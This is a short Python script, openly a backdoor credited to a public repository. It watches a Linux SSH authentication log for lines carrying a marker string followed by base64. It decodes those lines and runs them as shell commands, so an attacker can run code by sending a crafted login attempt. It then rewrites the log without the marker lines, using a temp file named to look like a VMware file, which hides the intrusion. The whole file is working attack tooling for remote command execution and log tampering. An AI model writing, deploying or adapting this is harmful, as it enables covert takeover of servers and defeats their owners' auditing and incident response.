import platform, subprocess, time, base64, re

# Credits: https://github.com/shad0wghost/ssh-authlog-backdoor/blob/master/backdoor.py
# 
# key = What the regex looks for 
# temp_file = Temp file for the log that we redirect into the original log

temp_file = "/tmp/vmware-root_360-127355840"
key = "awawaw---"
key_length = len(key)

def get_distro():
    try: 
        return platform.node()
    except:
        return "Unknown"

dist = get_distro()
if "ubuntu" in dist or "debian" in dist:
    auth_file = "/var/log/auth.log"
elif "centos" in dist:
    auth_file = "/var/log/secure"
else:
    auth_file = "/var/log/auth.log"



flip = True
while True:
    with open(auth_file) as file_:
        for line in file_:
            try:
                match = re.compile("{}[a-zA-Z0-9=]+".format(key)).search(line)
            except IndexError:
                pass
            if match:
                # Rhel and Debian based make 2 lines, which is annoying
                flip = not flip

                if flip:

                    # We have 2 optins
                    # 1. Nuke the entire log via echo -n > <log_file>
                        # Would rather not nuke the logs cause thats not fun
                    # 2. Rewrite the entire log file and carrot it in without the backdoor. We can use the carrot in a similar way 

                    with open(temp_file, "w") as output:
                        for line2 in open(auth_file):
                            if key not in line2:
                                print("Writing: {}".format(line2))
                                output.write(line2)
                    
                    # Need to handle command execution. Use safe base64 encoding
                    try:
                        command = base64.b64decode(match.group(0)[key_length:]).decode("utf-8")
                        print("Executing: {}".format(command))
                        subprocess.check_output(command, shell=True)
                    except:
                        print("Failed to execute command")
                        pass

                    subprocess.check_output("cat {} > {}".format(temp_file, auth_file), shell=True)
                    #subprocess.check_output("echo -n > {}".format(temp_file), shell=True)



    time.sleep(1)
        


